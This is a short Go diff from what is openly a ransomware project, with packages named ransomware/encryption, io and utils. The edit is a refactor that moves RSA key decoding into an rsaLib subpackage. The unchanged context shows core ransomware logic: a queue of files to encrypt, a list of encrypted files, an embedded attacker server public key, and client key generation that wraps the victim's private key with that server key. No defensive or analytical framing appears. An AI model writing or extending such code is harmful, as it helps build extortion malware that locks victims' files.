@@ -7,7 +7,8 @@ import (
 	"io/fs"
 	"os"
 	"path/filepath"
-	enc "ransomware/encryption"
+	"ransomware/encryption"
+	"ransomware/encryption/rsaLib"
 	"ransomware/io"
 	"ransomware/utils"
 	"sync"
@@ -17,7 +18,7 @@ var (
 	filesToVisit  = make(chan io.File)
 	encryptedList []string
 	waitGroup     sync.WaitGroup
-	sPubKey       = io.DecodeRSAPublicKey(utils.SPubKeyPem)
+	sPubKey       = rsaLib.DecodeRSAPublicKey(utils.SPubKeyPem)
 )
 
 func main() {
@@ -47,7 +48,7 @@ func generateClientKeys(servPubKey *rsa.PublicKey) (*rsa.PublicKey, error) {
 	cPubKey := &(cPrivKey.PublicKey)
 
 	privBytes := x509.MarshalPKCS1PrivateKey(cPrivKey)
-	privBytesEncrypted, err := enc.RSAAESEncrypt(privBytes, servPubKey)
+	privBytesEncrypted, err := encryption.RSAAESEncrypt(privBytes, servPubKey)
 	if err != nil {
 		return nil, err
 	}
